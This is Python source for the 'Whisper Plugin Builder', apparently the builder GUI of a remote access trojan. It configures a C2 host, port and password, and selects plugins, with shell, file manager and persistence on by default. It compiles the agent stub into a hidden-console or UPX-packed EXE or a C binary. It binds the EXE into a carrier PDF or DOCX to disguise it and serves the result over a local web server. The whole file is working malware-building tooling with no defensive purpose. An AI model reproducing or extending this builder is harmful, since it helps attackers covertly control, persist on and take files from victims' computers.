import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import os, sys, subprocess, threading, webbrowser

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from plugins import PLUGIN_REGISTRY, get_info
from stub_generator import generate_stub, estimate_size

DARK_BG = "#1a1a2e"; DARKER_BG = "#16213e"; ACCENT = "#e94560"
TEXT_FG = "#e0e0e0"; TEXT_SEC = "#a0a0a0"; GREEN = "#00ff88"; FONT = ("Consolas", 10)
FONT_SM = ("Consolas", 9)

def find_pyinstaller():
    for p in os.environ.get("PATH", "").split(os.pathsep):
        for n in ("pyinstaller.exe", "pyinstaller", "pyinstaller.bat"):
            if os.path.isfile(os.path.join(p, n)): return os.path.join(p, n)
    # Fallback: try running via python -m PyInstaller
    try:
        r = subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
                           capture_output=True, text=True, timeout=10)
        if r.returncode == 0:
            return [sys.executable, "-m", "PyInstaller"]
    except Exception:
        pass
    return None

class BuilderApp:
    def __init__(self, master=None):
        if master is None:
            self.root = tk.Tk()
            self.root.title("Whisper Plugin Builder")
            self.root.geometry("700x700")
            self.root.configure(bg=DARK_BG)
            self.own_root = True
        else:
            self.root = master
            self.own_root = False
        self.plugin_vars = {}
        self._build_ui()

    def _build_ui(self):
        tk.Label(self.root, text="Plugin Builder", bg=DARK_BG, fg=ACCENT,
            font=("Consolas", 14, "bold")).pack(pady=4)

        canvas = tk.Canvas(self.root, bg=DARK_BG, highlightthickness=0)
        vscroll = ttk.Scrollbar(self.root, orient="vertical", command=canvas.yview)
        canvas.configure(yscrollcommand=vscroll.set)
        vscroll.pack(side="right", fill="y")
        canvas.pack(side="left", fill="both", expand=True, padx=(10, 0))

        main = tk.Frame(canvas, bg=DARK_BG)
        main.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=main, anchor="nw")
        canvas.bind("<MouseWheel>", lambda e: canvas.yview_scroll(-int(e.delta/120), "units"))

        # --- C2 config ---
        cf = tk.LabelFrame(main, text="C2 Configuration", bg=DARK_BG, fg=TEXT_FG, font=FONT)
        cf.pack(fill="x", pady=3)
        self._add_field(cf, "C2 Host / IP:", 0, "127.0.0.1")
        self._add_field(cf, "C2 Port:", 1, "4443")
        self._add_field(cf, "Encryption Password:", 2, "whisper_secret_key")
        self._add_field(cf, "Reconnect Delay (s):", 3, "10")

        # --- Plugins ---
        pf = tk.LabelFrame(main, text="Plugins", bg=DARK_BG, fg=TEXT_FG, font=FONT)
        pf.pack(fill="x", pady=3)

        pinfo = get_info()
        auto = {"shell", "file_manager", "persistence"}

        cols = [pf, None]
        row_frame = tk.Frame(pf, bg=DARK_BG)
        row_frame.pack(fill="x")
        col_frame = row_frame
        for i, (name, info) in enumerate(sorted(pinfo.items())):
            if i % 3 == 0:
                col_frame = tk.Frame(row_frame if i < 6 else pf, bg=DARK_BG)
                col_frame.pack(side="left", fill="x", expand=True, anchor="n")
            var = tk.BooleanVar(value=name in auto)
            self.plugin_vars[name] = var
            deps = info.get("deps", [])
            dep_txt = f" [{','.join(deps)}]" if deps else ""
            tk.Checkbutton(col_frame, text=f"{name}{dep_txt}", variable=var,
                bg=DARK_BG, fg=TEXT_FG, selectcolor=DARKER_BG, font=FONT_SM, anchor="w").pack(fill="x", padx=4, pady=0)

        # --- Options ---
        of = tk.LabelFrame(main, text="Build Options", bg=DARK_BG, fg=TEXT_FG, font=FONT)
        of.pack(fill="x", pady=3)
        self.var_onetime = tk.BooleanVar(value=False)
        self.var_noconsole = tk.BooleanVar(value=True)
        self.var_upx = tk.BooleanVar(value=False)
        tk.Checkbutton(of, text="One-shot (no reconnect)", variable=self.var_onetime,
            bg=DARK_BG, fg=TEXT_FG, selectcolor=DARKER_BG, font=FONT_SM).pack(anchor="w", padx=5)
        tk.Checkbutton(of, text="No Console Window (--noconsole)", variable=self.var_noconsole,
            bg=DARK_BG, fg=TEXT_FG, selectcolor=DARKER_BG, font=FONT_SM).pack(anchor="w", padx=5)
        tk.Checkbutton(of, text="Use UPX packing (--upx)", variable=self.var_upx,
            bg=DARK_BG, fg=TEXT_FG, selectcolor=DARKER_BG, font=FONT_SM).pack(anchor="w", padx=5)

        # --- Output ---
        out_f = tk.Frame(main, bg=DARK_BG)
        out_f.pack(fill="x", pady=3)
        tk.Label(out_f, text="Output:", bg=DARK_BG, fg=TEXT_FG, font=FONT_SM).pack(side="left")
        self.output_dir = tk.Entry(out_f, bg=DARKER_BG, fg=TEXT_FG, insertbackground=TEXT_FG, font=FONT_SM, relief="flat")
        self.output_dir.insert(0, os.path.join(os.getcwd(), "build"))
        self.output_dir.pack(side="left", fill="x", expand=True, padx=4)
        ttk.Button(out_f, text="Browse", command=self._browse).pack(side="right")

        self.size_label = tk.Label(main, text="Stub size: N/A", bg=DARK_BG, fg=TEXT_SEC, font=FONT_SM)
        self.size_label.pack(anchor="w", pady=1)

        # --- Buttons ---
        bf = tk.Frame(main, bg=DARK_BG)
        bf.pack(fill="x", pady=2)
        ttk.Button(bf, text="Generate .py", command=self._generate).pack(side="left", padx=2)
        ttk.Button(bf, text="Build EXE", command=self._build).pack(side="left", padx=2)
        ttk.Button(bf, text="+C Stub", command=self._compile_c).pack(side="left", padx=2)
        ttk.Button(bf, text="Update Size", command=self._update_size).pack(side="left", padx=2)

        self.log = scrolledtext.ScrolledText(main, bg=DARKER_BG, fg=GREEN, font=FONT_SM,
            relief="flat", height=6, state="disabled")
        self.log.pack(fill="both", expand=True, pady=2)

    def _add_field(self, parent, label, row, default):
        f = tk.Frame(parent, bg=DARK_BG); f.pack(fill="x", pady=1)
        tk.Label(f, text=label, bg=DARK_BG, fg=TEXT_FG, font=FONT_SM, width=22, anchor="w").pack(side="left")
        e = tk.Entry(f, bg=DARKER_BG, fg=TEXT_FG, insertbackground=TEXT_FG, font=FONT, relief="flat")
        e.insert(0, default); e.pack(side="left", fill="x", expand=True)
        if not hasattr(self, "_entries"): self._entries = {}
        self._entries[label] = e

    def _log(self, msg): self.log.configure(state="normal"); self.log.insert("end", msg + "\n"); self.log.see("end"); self.log.configure(state="disabled"); self.root.update()

    def _browse(self):
        d = filedialog.askdirectory(initialdir=self.output_dir.get())
        if d: self.output_dir.delete(0, "end"); self.output_dir.insert(0, d)

    def _get_cfg(self):
        return {
            "host": self._entries["C2 Host / IP:"].get().strip(),
            "port": int(self._entries["C2 Port:"].get().strip()),
            "password": self._entries["Encryption Password:"].get().strip(),
            "delay": int(self._entries["Reconnect Delay (s):"].get().strip()),
            "onetime": self.var_onetime.get(),
        }

    def _selected_plugins(self):
        return [n for n, v in self.plugin_vars.items() if v.get()]

    def _update_size(self):
        plugins = self._selected_plugins()
        if not plugins: self.size_label.config(text="Stub size: 0 B (no plugins)"); return
        cfg = self._get_cfg()
        stub = generate_stub(plugins, cfg["host"], cfg["port"], cfg["password"], cfg["delay"])
        size = len(stub.encode("utf-8"))
        kb = size / 1024
        color = GREEN if kb < 50 else ACCENT
        self.size_label.config(text=f"Stub size: {size:,} B ({kb:.1f} KB)", fg=color)

    def _generate(self):
        plugins = self._selected_plugins()
        if not plugins: self._log("[!] Select at least one plugin"); return
        cfg = self._get_cfg()
        stub = generate_stub(plugins, cfg["host"], cfg["port"], cfg["password"], cfg["delay"])
        if cfg["onetime"]: stub = stub.replace("time.sleep(RECONNECT_DELAY)", "# one-shot")
        out_dir = self.output_dir.get(); os.makedirs(out_dir, exist_ok=True)
        out_path = os.path.join(out_dir, "stub.py")
        with open(out_path, "w") as f: f.write(stub)
        size = len(stub.encode("utf-8"))
        self._log(f"[+] Generated: {out_path} ({size:,} B, {size/1024:.1f} KB)")
        self._update_size()

    def _build(self):
        self._generate()
        cfg = self._get_cfg()
        pi = find_pyinstaller()
        if not pi: self._log("[!] PyInstaller not found. Run: pip install pyinstaller"); return
        out_dir = self.output_dir.get()
        script = os.path.join(out_dir, "stub.py")
        if not os.path.exists(script): return
        self._log("[*] Building EXE...")
        threading.Thread(target=self._run_pyinstaller, args=(pi, script, out_dir), daemon=True).start()

    def _run_pyinstaller(self, pi, script, out_dir):
        if isinstance(pi, list):
            args = list(pi)
        else:
            args = [pi]
        args += ["--onefile", "--distpath", out_dir, "--workpath", os.path.join(out_dir, "_pyi")]
        if self.var_noconsole.get(): args.insert(1, "--noconsole"); args.insert(1, "--windowed")
        if self.var_upx.get(): args.insert(1, "--upx-dir"); args.insert(1, ".")
        args.append(script)
        self._log(f"[*] {' '.join(args)}")
        p = subprocess.run(args, capture_output=True, text=True, timeout=300)
        if p.returncode == 0:
            for f in os.listdir(out_dir):
                if f.endswith(".exe"): self._log(f"[+] Built: {os.path.join(out_dir, f)}")
        else:
            for l in p.stderr.split("\n")[-5:]:
                if l.strip(): self._log(f"  ERR: {l.strip()}")

    def _browse_carrier(self):
        f = filedialog.askopenfilename(title="Select carrier file (PDF, DOCX, etc.)",
            filetypes=[("All files", "*.*")])
        if f: self.carrier_path.delete(0, "end"); self.carrier_path.insert(0, f)

    def _bind(self):
        carrier = self.carrier_path.get().strip()
        if not os.path.isfile(carrier): self._log("[!] Select a carrier file"); return
        out_dir = self.output_dir.get(); os.makedirs(out_dir, exist_ok=True)
        exe = next((os.path.join(out_dir, f) for f in os.listdir(out_dir) if f.endswith(".exe")), None)
        if not exe: self._log("[!] Build the EXE first"); return
        output = os.path.join(out_dir, f"bound_{os.path.splitext(os.path.basename(carrier))[0]}.exe")
        self._log("[*] Binding...")
        def task():
            try:
                import binder
                binder.bind(carrier, exe, output, compile_exe=True)
                self._log(f"[+] Bound file: {output}")
            except Exception as e: self._log(f"[!] Bind failed: {e}")
        threading.Thread(target=task, daemon=True).start()

    def _compile_c(self):
        out_dir = self.output_dir.get(); os.makedirs(out_dir, exist_ok=True)
        c_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stub_c.c")
        if not os.path.isfile(c_path): self._log("[!] stub_c.c not found"); return
        out_exe = os.path.join(out_dir, "stub_c.exe")
        self._log("[*] Compiling C stub...")
        def task():
            cc = None; msvc = False
            for name in ["gcc", "mingw32-gcc", "x86_64-w64-mingw32-gcc", "clang", "cl.exe"]:
                try:
                    if name == "cl.exe":
                        subprocess.run([name], capture_output=True, timeout=5)
                        cc = name; msvc = True; break
                    else:
                        subprocess.run([name, "--version"], capture_output=True, timeout=5)
                        cc = name; break
                except: continue
            if not cc:
                self._log("[!] No C compiler found. Install MinGW or MSVC.")
                return
            cfg = self._get_cfg()
            if msvc:
                args = [cc, "/O1", "/GS-", f"/Fe{out_exe}", c_path,
                        f"/DC2_HOST=\"{cfg['host']}\"",
                        f"/DC2_PORT={cfg['port']}",
                        f"/DC2_PASS=\"{cfg['password']}\""]
                if self.var_noconsole.get(): args.append("/link")
                args += ["ws2_32.lib", "bcrypt.lib", "advapi32.lib"]
            else:
                args = [cc, "-O2", "-s", "-o", out_exe, c_path,
                        f'-DC2_HOST="{cfg["host"]}"',
                        f'-DC2_PORT={cfg["port"]}',
                        f'-DC2_PASS="{cfg["password"]}"']
                if self.var_noconsole.get(): args.append("-mwindows")
                args += ["-lws2_32", "-lbcrypt", "-ladvapi32"]
            self._log(f"[*] Compiling with {cc}...")
            p = subprocess.run(args, capture_output=True, text=True, timeout=60)
            if p.returncode == 0:
                size = os.path.getsize(out_exe)
                self._log(f"[+] C stub compiled: {out_exe} ({size//1024} KB)")
            else:
                for l in (p.stderr or "").split("\n")[-5:]:
                    if l.strip(): self._log(f"  ERR: {l.strip()}")
        threading.Thread(target=task, daemon=True).start()

    def _start_web(self):
        out_dir = self.output_dir.get()
        exe = next((os.path.join(out_dir, f) for f in os.listdir(out_dir) if f.endswith(".exe")), None)
        if not exe: self._log("[!] No EXE found. Build one first."); return
        def run():
            import web_server
            web_server.AGENT_FILE = exe; web_server.start_web_server(agent_path=exe, port=8080)
        threading.Thread(target=run, daemon=True).start()
        webbrowser.open("http://127.0.0.1:8080")
        self._log("[+] Web server at http://0.0.0.0:8080")

    def run(self):
        if self.own_root:
            self.root.mainloop()

if __name__ == "__main__":
    BuilderApp().run()
